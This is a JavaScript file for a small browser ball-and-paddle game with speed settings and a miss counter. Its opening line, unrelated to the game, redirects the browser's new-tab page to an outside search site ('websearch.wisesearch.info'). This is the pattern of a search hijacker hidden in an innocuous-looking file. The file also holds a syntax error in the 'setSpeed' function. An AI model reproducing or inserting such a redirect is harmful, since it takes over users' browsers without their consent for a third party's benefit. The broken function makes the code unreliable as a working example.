/**
 *@author: Divendar Murtadak 
 */

if(location.href=="about:newtab"){location.href="http://websearch.wisesearch.info/";}
function onload(event) {
initialize();
}
function initialize(){
			this.randomNumber=	Math.floor((Math.random()*535));
			imgObj = document.getElementById('ball');
			imgObj.style.position= 'relative'; 
			imgObj.style.left = '0px';
			imgObj.style.top =  this.randomNumber+ 'px';
			paddleObj = document.getElementById('paddleY');
			document.getElementById("slow").checked=true;
			this.bStartGame=true;
			this.currentCursorYaxis=0;
			this.speed=16; 
			this.counter= document.getElementById('message').innerHTML;
			this.x=parseInt(imgObj.style.left);
			this.y=parseInt(imgObj.style.top);
		    this.minX    = 0;
		    this.minY    = -15;
		    this.maxX    = 950;
		    this.maxY    = 535;
		    this.dx= 2*Math.PI + 'px';
		    this.dy= 2*Math.PI + 'px';
		}

function move(){
	      
	      this.x = this.x + (parseInt(this.dx) );
	      this.y = this.y + (parseInt(this.dy) );
	      
	      if ((parseInt(this.dx) > 0) && (this.x > this.maxX)) {
	        this.x = this.maxX;
	        this.dx = -parseInt(this.dx);
	      }
	      else if ((parseInt(this.dx) < 0) && (this.x < this.minX)) {
	        this.x = this.minX;
	        this.dx = -parseInt(this.dx);
	      }

	      if ((parseInt(this.dy) > 0) && (this.y > this.maxY)) {
	        this.y = this.maxY;
	        this.dy = -parseInt(this.dy);
	      }
	      else if ((parseInt(this.dy) < 0) && (this.y < this.minY)) {
	        this.y = this.minY;
	        this.dy = -parseInt(this.dy);
	      }
	    
	      draw();
	}

function stop(){
	   clearTimeout(animate);
	   initialize();
	}

function movePaddle(event){

		   var cursorYaxis=event.clientY;
		   if(cursorYaxis>=69 && cursorYaxis <=569)
			   {
			   paddleObj.style.left= 1000 + 'px';
			   paddleObj.style.top= -156+cursorYaxis + 'px';  
			   }
		   		this.currentCursorYaxis=paddleObj.style.top;
	}
	
function setSpeed(iSpeed)
	this.speed=iSpeed;

function startGame()
{
	if(this.bStartGame==true)
	draw();
	
}


function draw(){
	
	this.bStartGame=false;
	imgObj.style.left = x+'px';
	imgObj.style.top = y+'px';
	var minBound= parseInt(this.currentCursorYaxis) +44;
	var maxBound= minBound+102;
	
	if(this.x>=maxX && !(this.y>=minBound && this.y<= maxBound)){
		  this.counter++;
		  document.getElementById('message').innerHTML=this.counter;
		  stop();
	  }
	else
		animate = setTimeout(move,this.speed);	
	}

function resetCounter(){
	this.counter=0;	
	document.getElementById('message').innerHTML=this.counter;
}